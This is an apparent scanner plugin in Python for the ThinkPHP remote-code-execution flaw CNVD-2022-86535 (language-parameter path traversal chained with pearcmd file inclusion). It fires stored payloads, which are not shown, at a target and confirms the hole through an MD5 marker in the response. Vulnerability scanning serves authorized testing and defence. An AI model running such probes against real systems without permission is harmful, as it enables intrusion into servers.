#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests
from thirdparty import HackRequests
from time import sleep

def cnvd_2022_86535_scan(self, url):
    ''' 如果 Thinkphp 程序开启了多语言功能, 
            攻击者可以通过 get、header、cookie 等位置传入参数, 实现目录穿越+文件包含, 
            通过pearcmd文件包含这个trick即可实现RCE
        v6.0.1 < Thinkphp < v6.0.13,
        Thinkphp v5.0.x,
        Thinkphp v5.1.x,
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CNVD-2022-86535'
    vul_info['vul_method'] = 'GET'
    # vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    res_list = []
    for payload in range(len(self.cnvd_2022_86535_payloads)):
        path = self.cnvd_2022_86535_payloads[payload]['path']
        headers = self.cnvd_2022_86535_payloads[payload]['headers']
        target = url + path

        vul_info['path'] = path
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            sleep(0.5)
            
            if (payload % 2 == 0):
                hack = HackRequests.hackRequests()

                res = hack.http(
                    target,
                    method='GET',
                    timeout=self.timeout,
                    headers=headers,
                    proxy=self.proxy,
                    location=False
                )
                res.method = 'GET'
                logger.logging(vul_info, res.status_code, res)                        # * LOG
                res_list.append(res)
                continue

            elif (payload % 2 == 1):
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
                res_list.append(res)

            md = md5(str(self.random_num), 32)
            if (md in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request-1': res_list[payload-1],
                    'Request-2': res_list[payload]
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
